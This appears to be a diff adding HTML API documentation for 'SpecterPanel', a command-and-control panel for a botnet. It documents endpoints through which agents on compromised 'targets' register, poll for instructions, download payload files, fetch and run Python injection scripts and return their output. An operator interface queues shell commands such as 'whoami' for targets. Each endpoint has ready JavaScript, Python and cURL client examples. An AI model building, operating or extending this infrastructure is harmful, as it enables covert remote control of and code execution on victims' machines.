+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="api_BotNet-js">JavaScript</button>
+            <button class="tab-btn" data-target="api_BotNet-py">Python</button>
+            <button class="tab-btn" data-target="api_BotNet-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="api_BotNet-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="api_BotNet-js" class="code">// JavaScript (fetch)
+fetch('http://SERVER/api/BotNet/demo_target?token=ABC123')
+  .then(response => {
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+    return response.json();
+  })
+  .then(data => console.log('BotNet data:', data))
+  .catch(error => console.error('Error:', error));</pre>
+
+        <pre id="api_BotNet-py" class="code" style="display:none"># Python (requests)
+import requests
+
+try:
+    response = requests.get(
+        'http://SERVER/api/BotNet/demo_target',
+        params={'token': 'ABC123'}
+    )
+    response.raise_for_status()
+    print("BotNet data:", response.json())
+except requests.exceptions.RequestException as e:
+    print("Error:", e)</pre>
+
+        <pre id="api_BotNet-curl" class="code" style="display:none"># cURL
+curl -X GET \
+  "http://SERVER/api/BotNet/demo_target?token=ABC123" \
+  -H "Accept: application/json"</pre>
+      </section>
+
+      <!-- API: /api/registor_target -->
+      <section id="api_registor_target">
+        <div class="meta">
+          <span class="method-badge">POST</span>
+          <h2 class="endpoint-path">/api/registor_target</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Register a new target with the SpecterPanel system. This endpoint creates a new target entry and returns the assigned target name (which may include a timestamp suffix for uniqueness).</p>
+          <p class="hint"><strong>Note:</strong> Requires a valid ApiToken with registration permissions.</p>
+        </div>
+        
+        <h3>Request Body (JSON)</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>token</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>ApiToken with registration permissions</td>
+          </tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Desired base name for the target (server may append timestamp)</td>
+          </tr>
+          <tr>
+            <td>ip</td>
+            <td>string</td>
+            <td></td>
+            <td>Agent's current IP address (optional)</td>
+          </tr>
+          <tr>
+            <td>os</td>
+            <td>string</td>
+            <td></td>
+            <td>Agent's operating system (optional)</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Target registered</div>
+            <pre class="code">{ "target_name": "demo_target_20230811120000" }</pre>
+          </div>
+          <div class="json">
+            <div class="hint"><span class="status-code status-403">403</span> Invalid or unauthorized token</div>
+            <pre class="code">{ "Error": "Invalid api_token" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="api_registor_target-js">JavaScript</button>
+            <button class="tab-btn" data-target="api_registor_target-py">Python</button>
+            <button class="tab-btn" data-target="api_registor_target-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="api_registor_target-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="api_registor_target-js" class="code">// JavaScript (fetch)
+fetch('http://SERVER/api/registor_target', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    token: 'ABC123',
+    target_name: 'demo_target',
+    ip: '10.0.0.2',
+    os: 'linux'
+  })
+})
+.then(response => response.json())
+.then(data => console.log('Registered target:', data.target_name))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="api_registor_target-py" class="code" style="display:none"># Python (requests)
+import requests
+
+registration_data = {
+    'token': 'ABC123',
+    'target_name': 'demo_target',
+    'ip': '10.0.0.2',
+    'os': 'linux'
+}
+
+try:
+    response = requests.post(
+        'http://SERVER/api/registor_target',
+        json=registration_data
+    )
+    print("Registered target:", response.json())
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="api_registor_target-curl" class="code" style="display:none"># cURL
+curl -X POST "http://SERVER/api/registor_target" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "token": "ABC123",
+    "target_name": "demo_target",
+    "ip": "10.0.0.2",
+    "os": "linux"
+  }'</pre>
+      </section>
+
+      <!-- API: /api/get_instraction/<target_name> -->
+      <section id="api_get_instraction">
+        <div class="meta">
+          <span class="method-badge">GET</span>
+          <h2 class="endpoint-path">/api/get_instraction/&lt;target_name&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Retrieve the current instruction and delay interval for a target. Agents should call this endpoint to check for new instructions and determine how long to wait before checking again.</p>
+        </div>
+        
+        <h3>Parameters</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>token</td>
+            <td>string</td>
+            <td>query</td>
+            <td><span class="required">*</span></td>
+            <td>API token for authentication</td>
+          </tr>
+          <tr>
+            <td>ip</td>
+            <td>string</td>
+            <td>query</td>
+            <td></td>
+            <td>Agent's IP address (optional)</td>
+          </tr>
+          <tr>
+            <td>os</td>
+            <td>string</td>
+            <td>query</td>
+            <td></td>
+            <td>Agent's operating system (optional)</td>
+          </tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td>path</td>
+            <td><span class="required">*</span></td>
+            <td>Unique identifier for the target machine</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Returns instruction and delay</div>
+            <pre class="code">{
+  "delay": 60,
+  "instraction": "check_for_updates"
+}</pre>
+          </div>
+          <div class="json">
+            <div class="hint"><span class="status-code status-404">404</span> No instruction found</div>
+            <pre class="code">{ "Message": "No instraction found" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="api_get_instraction-js">JavaScript</button>
+            <button class="tab-btn" data-target="api_get_instraction-py">Python</button>
+            <button class="tab-btn" data-target="api_get_instraction-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="api_get_instraction-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="api_get_instraction-js" class="code">// JavaScript (fetch)
+fetch('http://SERVER/api/get_instraction/demo_target?token=ABC123&ip=10.0.0.2&os=linux')
+  .then(response => {
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+    return response.json();
+  })
+  .then(data => {
+    console.log('Instruction:', data.instraction);
+    console.log('Next check in:', data.delay, 'seconds');
+  })
+  .catch(error => console.error('Error:', error));</pre>
+
+        <pre id="api_get_instraction-py" class="code" style="display:none"># Python (requests)
+import requests
+
+params = {
+    'token': 'ABC123',
+    'ip': '10.0.0.2',
+    'os': 'linux'
+}
+
+try:
+    response = requests.get(
+        'http://SERVER/api/get_instraction/demo_target',
+        params=params
+    )
+    response.raise_for_status()
+    data = response.json()
+    print("Instruction:", data.get('instraction'))
+    print("Next check in:", data.get('delay'), "seconds")
+except requests.exceptions.RequestException as e:
+    print("Error:", e)</pre>
+
+        <pre id="api_get_instraction-curl" class="code" style="display:none"># cURL
+curl -X GET \
+  "http://SERVER/api/get_instraction/demo_target?token=ABC123&ip=10.0.0.2&os=linux" \
+  -H "Accept: application/json"</pre>
+      </section>
+
+      <!-- API: /api/lib/<usePyload> -->
+      <section id="api_lib">
+        <div class="meta">
+          <span class="method-badge">GET</span>
+          <h2 class="endpoint-path">/api/lib/&lt;usePyload&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Retrieve a library or payload file from the server. This endpoint serves static files that agents may need for their operation.</p>
+          <p class="hint"><strong>Note:</strong> The implementation expects the token in the JSON body, which is unusual for GET requests. Consult server code for exact requirements.</p>
+        </div>
+        
+        <h3>Parameters</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>token</td>
+            <td>string</td>
+            <td>body</td>
+            <td><span class="required">*</span></td>
+            <td>API token for authentication</td>
+          </tr>
+          <tr>
+            <td>ip</td>
+            <td>string</td>
+            <td>body</td>
+            <td></td>
+            <td>Agent's IP address (optional)</td>
+          </tr>
+          <tr>
+            <td>os</td>
+            <td>string</td>
+            <td>body</td>
+            <td></td>
+            <td>Agent's operating system (optional)</td>
+          </tr>
+          <tr>
+            <td>usePyload</td>
+            <td>string</td>
+            <td>path</td>
+            <td><span class="required">*</span></td>
+            <td>Filename of the payload to retrieve</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Returns file content</div>
+            <pre class="code">(Raw file content as text/plain)</pre>
+          </div>
+          <div class="json">
+            <div class="hint"><span class="status-code status-404">404</span> File not found</div>
+            <pre class="code">{ "Error": "File not found" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="api_lib-js">JavaScript</button>
+            <button class="tab-btn" data-target="api_lib-py">Python</button>
+            <button class="tab-btn" data-target="api_lib-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="api_lib-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="api_lib-js" class="code">// JavaScript (fetch)
+// Note: GET with body may not be supported by all browsers/servers
+fetch('http://SERVER/api/lib/example_payload', {
+  method: 'GET',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    token: 'ABC123',
+    ip: '10.0.0.2',
+    os: 'linux'
+  })
+})
+.then(response => response.text())
+.then(text => console.log('File content:', text))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="api_lib-py" class="code" style="display:none"># Python (requests)
+import requests
+
+payload = {
+    'token': 'ABC123',
+    'ip': '10.0.0.2',
+    'os': 'linux'
+}
+
+try:
+    # Note: GET with body is non-standard but works with requests
+    response = requests.get(
+        'http://SERVER/api/lib/example_payload',
+        json=payload
+    )
+    print("File content:", response.text)
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="api_lib-curl" class="code" style="display:none"># cURL
+curl -X GET "http://SERVER/api/lib/example_payload" \
+  -H "Content-Type: application/json" \
+  -d '{"token":"ABC123","ip":"10.0.0.2","os":"linux"}'</pre>
+      </section>
+
+      <!-- API: /api/injection/<target_name> -->
+      <section id="api_injection">
+        <div class="meta">
+          <span class="method-badge">GET/POST</span>
+          <h2 class="endpoint-path">/api/injection/&lt;target_name&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Retrieve or submit Python injection scripts. GET requests fetch the current injection script, while POST requests submit execution results.</p>
+        </div>
+        
+        <h3>Parameters</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>token</td>
+            <td>string</td>
+            <td>query (GET) / body (POST)</td>
+            <td><span class="required">*</span></td>
+            <td>API token for authentication</td>
+          </tr>
+          <tr>
+            <td>ip</td>
+            <td>string</td>
+            <td>query/body</td>
+            <td></td>
+            <td>Agent's IP address (optional)</td>
+          </tr>
+          <tr>
+            <td>os</td>
+            <td>string</td>
+            <td>query/body</td>
+            <td></td>
+            <td>Agent's operating system (optional)</td>
+          </tr>
+          <tr>
+            <td>code_output</td>
+            <td>string</td>
+            <td>body (POST only)</td>
+            <td>POST: <span class="required">*</span></td>
+            <td>Output from executed injection script (POST only)</td>
+          </tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td>path</td>
+            <td><span class="required">*</span></td>
+            <td>Unique identifier for the target machine</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> GET Success - Returns injection script</div>
+            <pre class="code">{ "script": "print('Hello from injection')" }</pre>
+          </div>
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> POST Success - Output saved</div>
+            <pre class="code">{ "message": "Injection output saved" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="api_injection-js">JavaScript</button>
+            <button class="tab-btn" data-target="api_injection-py">Python</button>
+            <button class="tab-btn" data-target="api_injection-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="api_injection-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="api_injection-js" class="code">// JavaScript (fetch) - GET script
+fetch('http://SERVER/api/injection/demo_target?token=ABC123')
+  .then(response => response.json())
+  .then(data => console.log('Injection script:', data.script))
+  .catch(error => console.error('Error:', error));
+
+// JavaScript (fetch) - POST output
+fetch('http://SERVER/api/injection/demo_target', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    token: 'ABC123',
+    code_output: 'Injection completed successfully'
+  })
+})
+.then(response => response.json())
+.then(data => console.log('Server response:', data))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="api_injection-py" class="code" style="display:none"># Python (requests) - GET script
+import requests
+
+try:
+    response = requests.get(
+        'http://SERVER/api/injection/demo_target',
+        params={'token': 'ABC123'}
+    )
+    print("Injection script:", response.json().get('script'))
+except Exception as e:
+    print("Error:", e)
+
+# Python (requests) - POST output
+output_data = {
+    'token': 'ABC123',
+    'code_output': 'Injection completed successfully'
+}
+
+try:
+    response = requests.post(
+        'http://SERVER/api/injection/demo_target',
+        json=output_data
+    )
+    print("Server response:", response.json())
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="api_injection-curl" class="code" style="display:none"># cURL - GET script
+curl -X GET "http://SERVER/api/injection/demo_target?token=ABC123"
+
+# cURL - POST output
+curl -X POST "http://SERVER/api/injection/demo_target" \
+  -H "Content-Type: application/json" \
+  -d '{"token":"ABC123","code_output":"Injection completed successfully"}'</pre>
+      </section>
+
+      <!-- View.py endpoints -->
+      <section id="view_api_command">
+        <div class="meta">
+          <span class="method-badge">GET/POST</span>
+          <h2 class="endpoint-path">/api_command/&lt;targetName&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Web interface endpoint for managing commands. GET requests render the web interface, while POST requests add new commands for the specified target.</p>
+          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
+        </div>
+        
+        <h3>Parameters (POST JSON)</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>input</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Command text to be executed by the target</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> POST Success - Command added</div>
+            <pre class="code">{
+  "message": "command saved successfully",
+  "id": "cmd123",
+  "target_name": "demo_target"
+}</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="view_api_command-js">JavaScript</button>
+            <button class="tab-btn" data-target="view_api_command-py">Python</button>
+            <button class="tab-btn" data-target="view_api_command-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="view_api_command-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="view_api_command-js" class="code">// JavaScript (fetch) - requires session cookie
+fetch('/api_command/demo_target', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  credentials: 'include',
+  body: JSON.stringify({ input: 'whoami' })
+})
+.then(response => response.json())
+.then(data => console.log('Command saved:', data))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="view_api_command-py" class="code" style="display:none"># Python (requests) - using session with cookies
+import requests
+
+# First authenticate (example)
+session = requests.Session()
+login_response = session.post('http://SERVER/login', data={
+    'username': 'admin',
+    'password': 'password'
+})
+
+# Then make authenticated request
+try:
+    response = session.post(
+        'http://SERVER/api_command/demo_target',
+        json={'input': 'whoami'}
+    )
+    print("Command saved:", response.json())
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="view_api_command-curl" class="code" style="display:none"># cURL - requires session cookie
+# First login and save cookies (example)
+curl -c cookies.txt -X POST "http://SERVER/login" \
+  -d "username=admin&password=password"
+
+# Then make authenticated request
+curl -b cookies.txt -X POST "http://SERVER/api_command/demo_target" \
+  -H "Content-Type: application/json" \
+  -d '{"input":"whoami"}'</pre>
+      </section>
+
+      <section id="view_check_update">
+        <div class="meta">
+          <span class="method-badge">GET</span>
+          <h2 class="endpoint-path">/check_command_update/&lt;target_name&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Check for updated command outputs from a target. Used by the web interface to poll for new command results.</p>
+          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
+        </div>
+        
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Returns updated commands</div>
+            <pre class="code">{
+  "message": "Commands checked successfully",
+  "updated_commands": [
+    ["user123", "cmd123"],
+    ["Linux hostname", "cmd124"]
+  ]
+}</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="view_check_update-js">JavaScript</button>
+            <button class="tab-btn" data-target="view_check_update-py">Python</button>
+            <button class="tab-btn" data-target="view_check_update-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="view_check_update-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="view_check_update-js" class="code">// JavaScript (fetch) - requires session cookie
+fetch('/check_command_update/demo_target', {
+  credentials: 'include'
+})
+.then(response => response.json())
+.then(data => console.log('Updated commands:', data.updated_commands))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="view_check_update-py" class="code" style="display:none"># Python (requests) - using session with cookies
+import requests
+
+# Using existing authenticated session
+try:
+    response = session.get(
+        'http://SERVER/check_command_update/demo_target'
+    )
+    print("Updated commands:", response.json().get('updated_commands'))
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="view_check_update-curl" class="code" style="display:none"># cURL - requires session cookie
+curl -b cookies.txt "http://SERVER/check_command_update/demo_target"</pre>
+      </section>
+
+      <section id="view_delete_command">
+        <div class="meta">
+          <span class="method-badge">POST</span>
+          <h2 class="endpoint-path">/api_command/delete</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Delete a command from the system. Note that while the route suggests DELETE method, the implementation expects POST.</p>
+          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
+        </div>
+        
+        <h3>Request Body (JSON)</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Target associated with the command</td>
+          </tr>
+          <tr>
+            <td>id</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>ID of the command to delete</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Command deleted</div>
+            <pre class="code">{ "message": "Command deleted successfully" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="view_delete_command-js">JavaScript</button>
+            <button class="tab-btn" data-target="view_delete_command-py">Python</button>
+            <button class="tab-btn" data-target="view_delete_command-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="view_delete_command-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="view_delete_command-js" class="code">// JavaScript (fetch) - requires session cookie
+fetch('/api_command/delete', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  credentials: 'include',
+  body: JSON.stringify({
+    target_name: 'demo_target',
+    id: 'cmd123'
+  })
+})
+.then(response => response.json())
+.then(data => console.log('Server response:', data))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="view_delete_command-py" class="code" style="display:none"># Python (requests) - using session with cookies
+try:
+    response = session.post(
+        'http://SERVER/api_command/delete',
+        json={
+            'target_name': 'demo_target',
+            'id': 'cmd123'
+        }
+    )
+    print("Server response:", response.json())
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="view_delete_command-curl" class="code" style="display:none"># cURL - requires session cookie
+curl -b cookies.txt -X POST "http://SERVER/api_command/delete" \
+  -H "Content-Type: application/json" \
+  -d '{"target_name":"demo_target","id":"cmd123"}'</pre>
+      </section>
+
+      <section id="view_api_command_api">
+        <div class="meta">
+          <span class="method-badge">GET</span>
+          <h2 class="endpoint-path">/api_command/api/&lt;targetName&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Retrieve all commands for a target in API format. Used by the web interface to display commands.</p>
+          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
+        </div>
+        
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - Returns all commands</div>
+            <pre class="code">{
+  "allCommand": [
+    ["ID", "email", "target_name", "command", "condition", "update"],
+    ["cmd123", "admin@example.com", "demo_target", "whoami", "linux", "2023-08-11 12:00:00"],
+    ...
+  ]
+}</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="view_api_command_api-js">JavaScript</button>
+            <button class="tab-btn" data-target="view_api_command_api-py">Python</button>
+            <button class="tab-btn" data-target="view_api_command_api-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="view_api_command_api-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="view_api_command_api-js" class="code">// JavaScript (fetch) - requires session cookie
+fetch('/api_command/api/demo_target', {
+  credentials: 'include'
+})
+.then(response => response.json())
+.then(data => console.log('Commands:', data.allCommand))
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="view_api_command_api-py" class="code" style="display:none"># Python (requests) - using session with cookies
+try:
+    response = session.get(
+        'http://SERVER/api_command/api/demo_target'
+    )
+    print("Commands:", response.json().get('allCommand'))
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="view_api_command_api-curl" class="code" style="display:none"># cURL - requires session cookie
+curl -b cookies.txt "http://SERVER/api_command/api/demo_target"</pre>
+      </section>
+
+      <section id="view_api_link">
+        <div class="meta">
+          <span class="method-badge">GET/POST</span>
+          <h2 class="endpoint-path">/api_link</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Manage API links. GET requests render the web interface, while POST requests create new API links.</p>
+          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login). POST expects form data.</p>
+        </div>
+        
+        <h3>Parameters (POST Form)</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>target_name</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>Target associated with the API link</td>
+          </tr>
+          <tr>
+            <td>link</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>URL or endpoint for the API link</td>
+          </tr>
+          <tr>
+            <td>action_type</td>
+            <td>string</td>
+            <td><span class="required">*</span></td>
+            <td>HTTP method (GET, POST, etc.)</td>
+          </tr>
+          <tr>
+            <td>condition</td>
+            <td>integer</td>
+            <td></td>
+            <td>Condition for the link (optional)</td>
+          </tr>
+        </table>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="view_api_link-js">JavaScript</button>
+            <button class="tab-btn" data-target="view_api_link-py">Python</button>
+            <button class="tab-btn" data-target="view_api_link-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="view_api_link-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="view_api_link-js" class="code">// JavaScript (fetch) - Form POST
+const formData = new FormData();
+formData.append('target_name', 'demo_target');
+formData.append('link', 'http://example.com/api');
+formData.append('action_type', 'GET');
+formData.append('condition', '1');
+
+fetch('/api_link', {
+  method: 'POST',
+  credentials: 'include',
+  body: formData
+})
+.then(() => {
+  console.log('API link created');
+  // Typically would refresh the page or update UI
+})
+.catch(error => console.error('Error:', error));</pre>
+
+        <pre id="view_api_link-py" class="code" style="display:none"># Python (requests) - Form POST
+form_data = {
+    'target_name': 'demo_target',
+    'link': 'http://example.com/api',
+    'action_type': 'GET',
+    'condition': '1'
+}
+
+try:
+    response = session.post(
+        'http://SERVER/api_link',
+        data=form_data
+    )
+    print("API link created")
+except Exception as e:
+    print("Error:", e)</pre>
+
+        <pre id="view_api_link-curl" class="code" style="display:none"># cURL - Form POST
+curl -b cookies.txt -X POST "http://SERVER/api_link" \
+  -F "target_name=demo_target" \
+  -F "link=http://example.com/api" \
+  -F "action_type=GET" \
+  -F "condition=1"</pre>
+      </section>
+
+      <section id="view_api_link_delete">
+        <div class="meta">
+          <span class="method-badge">GET</span>
+          <h2 class="endpoint-path">/api_link_delete/&lt;ID&gt;</h2>
+        </div>
+        
+        <div class="endpoint-summary">
+          <p>Delete an API link by its ID.</p>
+          <p class="hint"><strong>Note:</strong> Requires valid session authentication (web login).</p>
+        </div>
+        
+        <h3>Parameters</h3>
+        <table>
+          <tr><th>Name</th><th>Type</th><th>Location</th><th>Required</th><th>Description</th></tr>
+          <tr>
+            <td>ID</td>
+            <td>string</td>
+            <td>path</td>
+            <td><span class="required">*</span></td>
+            <td>ID of the API link to delete</td>
+          </tr>
+        </table>
+
+        <h3>Responses</h3>
+        <div class="response">
+          <div class="json">
+            <div class="hint"><span class="status-code status-200">200</span> Success - API link deleted</div>
+            <pre class="code">{ "message": "API link deleted successfully" }</pre>
+          </div>
+        </div>
+
+        <h3>Examples</h3>
+        <div class="code-toolbar">
+          <div class="tabs">
+            <button class="tab-btn active" data-target="view_api_link_delete-js">JavaScript</button>
+            <button class="tab-btn" data-target="view_api_link_delete-py">Python</button>
+            <button class="tab-btn" data-target="view_api_link_delete-curl">cURL</button>
+          </div>
+          <button class="copy-btn" data-copy-target="view_api_link_delete-js">
+            <svg viewBox="0 0 24 24" width="14" height="14">
+              <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
+            </svg>
+            Copy
+          </button>
+        </div>
+
+        <pre id="view_api_link_delete-js" class="code">// JavaScript (fetch) - requires session cookie
+fetch('/api_link_delete/link123', {
+  credentials: 'include'
+})
+.then(response => response.json())
+.then(data => console.log('Server response:', data))
+.catch(error => console.error('Error:', error));</pre>
+
